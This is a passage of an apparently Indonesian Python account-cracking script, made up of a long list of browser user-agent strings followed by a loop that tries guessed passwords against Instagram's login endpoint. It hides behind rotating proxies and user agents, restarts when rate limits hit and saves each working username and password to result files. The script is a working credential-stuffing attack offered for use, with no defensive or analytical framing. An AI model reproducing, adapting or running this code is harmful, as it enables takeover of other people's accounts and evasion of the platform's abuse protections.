  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
  "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
  "DoCoMo/2.0 P903i(c100;TB;W24H12)",
  "DoCoMo/2.0 P903i",
  "DoCoMo/2.0 SH10C(c500;TB;W16H12)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
  "Mogujie4Android/NAMhuawei/1290",
  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
  "nokia-7.1-safari",
  "NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
  "Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
  "Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
  "Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
  "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "Dalvik/2.1.0 (Linux; U; Android 5.1)",
  "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
  "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
  "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
  "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
  "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
        try:
            for pw in pwx:
                pw = pw.lower()
                ___url = ('https://www.instagram.com/')
                ___login = ('https://www.instagram.com/accounts/login/ajax/')
                ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                ___csrf = requests.get(___url).cookies['csrftoken']
                ___data = {'username': uid,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
                'queryParams': {},
                'optIntoOneTap': 'false'}
                ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://z-p42.www.instagram.com/accounts/login/',
                'x-csrftoken': ___csrf}
                with requests.Session() as ses:
                    response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
                    if 'userId' in str(response):
                        #coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"')
                        try:
                            ___roz = requests.get(f'https://i.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{T}║ [{H}✔{T}]{A} Status {T}:{H} SUCCESS LOGIN")
                        print(f"{T}║ [{Z}>{T}]{A} Username {T}:{H} {uid}")
                        print(f"{T}║ [{Z}>{T}]{A} Password {T}:{H} {pw}")
                        print(f"{T}║ [{Z}>{T}]{A} Follower {T}:{H} {follower}")
                        print(f"{T}║ [{Z}>{T}]{A} Following {T}:{H} {following}\n")
                        #print(f"{T}║ [{Z}>{T}]{A} Cookie :{H} {coki}\n")
                        self.ok.append(f"{uid}|{pw}")
                        open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'checkpoint_required' in str(response):
                        try:
                            ___roz = requests.get(f'https://i.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{T}║ [{M}✘{T}]{A} Status {T}:{K} CHECKPOINT LOGIN")
                        print(f"{T}║ [{Z}>{T}]{A} Username {T}:{K} {uid}")
                        print(f"{T}║ [{Z}>{T}]{A} Password {T}:{K} {pw}")
                        print(f"{T}║ [{Z}>{T}]{A} Follower {T}:{K} {follower}")
                        print(f"{T}║ [{Z}>{T}]{A} Following {T}:{K} {following}\n")
                        self.cp.append(f"{uid}|{pw}")
                        open('Results/Cp.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'Please wait' in str(response):
                        print(f"{P}[{M}!{P}]{M} Use Airplane Mode 2 Seconds", end='\r');sleep(7);__main__(self, user, uid, pwx)
                    else:
                        continue
            self.kill +=1
            print(f"{T}╚═➣ [{J}Crack{T}]{A} {self.kill}/{str(len(user))} {J}Cp:-{len(self.cp)} {H}Ok:-{len(self.ok)}          ", end='\r')
        except (ConnectionError):
            print(f"{T}╚═➣ [{Z}!{T}]{J} connection Error               ", end='\r');sleep(7);__main__(self, user, uid, pwx)
        except:__main__(self, user, uid, pwx)

########## PROGRAM DONE ##########
if __name__=='__main__':
	kontol()
